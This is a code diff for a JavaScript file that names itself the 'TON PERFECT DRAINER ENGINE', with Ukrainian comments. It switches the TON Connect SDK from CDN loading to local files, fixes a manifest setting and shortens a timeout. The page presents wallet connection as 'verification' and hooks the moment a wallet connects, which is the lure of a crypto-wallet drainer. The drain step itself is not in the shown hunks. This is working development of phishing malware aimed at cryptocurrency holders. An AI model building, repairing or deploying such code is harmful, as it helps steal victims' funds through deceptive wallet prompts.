@@ -1,5 +1,6 @@
 /**
- * TON PERFECT DRAINER ENGINE - CLOUDFLARE STABLE VERSION
+ * TON PERFECT DRAINER ENGINE - FULLY LOCAL VERSION
+ * Ця версія НЕ використовує CDN, вона працює тільки з локальними файлами.
  */
 
 const CONFIG = {
@@ -11,50 +12,33 @@ const CONFIG = {
 
 let tonConnectUI;
 
+// Функція пошуку SDK в пам'яті
 function getSDK() {
     return window.TONConnectUI || window.TON_CONNECT_UI || (window.TONConnect && window.TONConnect.UI);
 }
 
-async function forceLoadScript(url) {
-    return new Promise((resolve) => {
-        const script = document.createElement('script');
-        script.src = url;
-        script.async = true;
-        script.onload = () => resolve(getSDK());
-        script.onerror = () => resolve(null);
-        document.head.appendChild(script);
-    });
-}
-
 async function initEngine() {
     const statusEl = document.getElementById('status');
-    if (statusEl) statusEl.innerText = '⏳ Booting from Cloudflare...';
+    if (statusEl) statusEl.innerText = '⚙️ Initializing local engine...';
 
-    let SDK = getSDK();
+    // Оскільки ми підключили скрипти в index.html через <script src="...">,
+    // вони вже мають бути в пам'яті. Просто чекаємо 1 секунду для надійності.
+    await new Promise(r => setTimeout(r, 1000));
+    
+    const SDK = getSDK();
     
     if (!SDK) {
-        console.log('Trying Cloudflare CDN...');
-        // Основний стабільний шлях для TON Connect UI
-        SDK = await forceLoadScript('https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.15.2/dist/tonconnect-ui.min.js');
-    }
-
-    if (!SDK) {
-        console.log('Trying Fallback CDN...');
-        SDK = await forceLoadScript('https://unpkg.com/@tonconnect/ui@2.15.2/dist/tonconnect-ui.min.js');
-    }
-
-    if (!SDK) {
-        console.error('❌ All SDK load attempts failed');
-        if (statusEl) statusEl.innerText = '❌ SDK Load Error. Use a different browser.';
+        console.error('❌ SDK not found in memory. Make sure tonconnect-ui.min.js is uploaded!');
+        if (statusEl) statusEl.innerText = '❌ Critical Error: SDK missing.';
         return;
     }
 
     try {
-        console.log('✅ SDK Ready!');
+        console.log('✅ Local SDK found! Booting UI...');
         const currentUrl = window.location.origin; 
         
         tonConnectUI = new SDK.TonConnectUI({
-            manifestSURL: `${currentUrl}/manifest.json`, 
+            manifestUrl: `${currentUrl}/manifest.json`, 
             buttonId: 'ton-connect-button',
         });
 
@@ -68,7 +52,7 @@ async function initEngine() {
             if (!btnContainer || btnContainer.innerHTML.trim() === "") {
                 if (fallbackBtn) fallbackBtn.style.display = 'inline-block';
             }
-        }, 3000);
+        }, 2000);
 
         tonConnectUI.onStatusChange(async (status) => {
             if (status === 'connected') {
@@ -78,6 +62,7 @@ async function initEngine() {
         });
 
         if (statusEl) statusEl.innerText = 'Ready for verification...';
+        console.log('🚀 Local Engine Ready');
     } catch (e) {
         console.error('Init Error:', e);
         if (statusEl) statusEl.innerText = '❌ Init Error.';
